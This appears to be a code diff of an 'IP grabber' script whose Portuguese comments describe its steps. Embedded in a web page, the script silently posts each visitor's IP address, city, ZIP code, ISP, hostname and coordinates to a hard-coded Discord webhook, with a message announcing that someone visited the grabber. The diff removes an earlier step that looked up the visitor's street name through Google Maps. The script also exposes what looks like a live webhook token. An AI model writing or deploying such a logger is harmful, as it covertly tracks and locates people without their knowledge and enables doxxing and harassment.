@@ -1,57 +1,35 @@
 <script>
 function monke(json) {
-    // Extraindo as coordenadas (latitude e longitude) do IP
-    var coordinates = json.loc.split(',');
+    var request = new XMLHttpRequest();
+    
+    // Configura o webhook do Discord
+    request.open("POST", "https://discord.com/api/webhooks/1319357339748274268/XxPzeXO6nziJsVpXtLucU_9o5aG7sgADzCOgHR7yuOso51bQPtnUQmYQExP5FVfGWYU_");
 
-    // Obter latitude e longitude
-    var lat = coordinates[0];
-    var lng = coordinates[1];
+    request.setRequestHeader('Content-type', 'application/json');
 
-    // Criar a URL para a API de geocodificação do Google Maps
-    var googleMapsUrl = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + lat + "," + lng + "&key=YOUR_GOOGLE_MAPS_API_KEY";
-
-    // Fazer a requisição para a API do Google Maps
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", googleMapsUrl, true);
-    xhr.onload = function() {
-        if (xhr.status == 200) {
-            var response = JSON.parse(xhr.responseText);
-            // Pegar o nome da rua da resposta
-            var street = response.results[0].address_components[1].long_name;
-
-            // Enviar os dados para o Discord Webhook
-            var request = new XMLHttpRequest();
-            request.open("POST", "https://discord.com/api/webhooks/1319357339748274268/XxPzeXO6nziJsVpXtLucU_9o5aG7sgADzCOgHR7yuOso51bQPtnUQmYQExP5FVfGWYU_");
-
-            request.setRequestHeader('Content-type', 'application/json');
-
-            var params = {
-                username: "IP Logger",
-                avatar_url: "",
-                content: "@everyone",
-                embeds: [
-                    {
-                        title: "Someone visited the IP grabber!",
-                        color: 1752220,
-                        description: 
-                            "**IP:** `" + json.ip + "`\n" +
-                            "**Country:** `" + json.country + "`\n" +
-                            "**Region:** `" + json.region + "`\n" +
-                            "**City:** `" + json.city + "`\n" +
-                            "**Street:** `" + street + "`\n" + // Nome da rua
-                            "**ZIP:** `" + json.postal + "`\n" +
-                            "**Organization:** `" + json.org + "`\n" +
-                            "**Hostname:** `" + json.hostname + "`\n" +
-                            "**Location (Lat/Lng):** `" + json.loc + "`"
-                    }
-                ]
-            };
-
-            // Enviar os dados formatados para o Discord
-            request.send(JSON.stringify(params));
-        }
+    var params = {
+        username: "IP Logger",
+        avatar_url: "",
+        content: "@everyone",
+        embeds: [
+            {
+                title: "Someone visited the IP grabber!",
+                color: 1752220,
+                description: 
+                    "**IP:** `" + json.ip + "`\n" +
+                    "**Country:** `" + json.country + "`\n" +
+                    "**Region:** `" + json.region + "`\n" +
+                    "**City:** `" + json.city + "`\n" +
+                    "**ZIP:** `" + json.postal + "`\n" +
+                    "**Organization:** `" + json.org + "`\n" +
+                    "**Hostname:** `" + json.hostname + "`\n" +
+                    "**Location (Lat/Lng):** `" + json.loc + "`"
+            }
+        ]
     };
-    xhr.send();
+
+    // Envia os dados para o Discord
+    request.send(JSON.stringify(params));
 }
 </script>
 
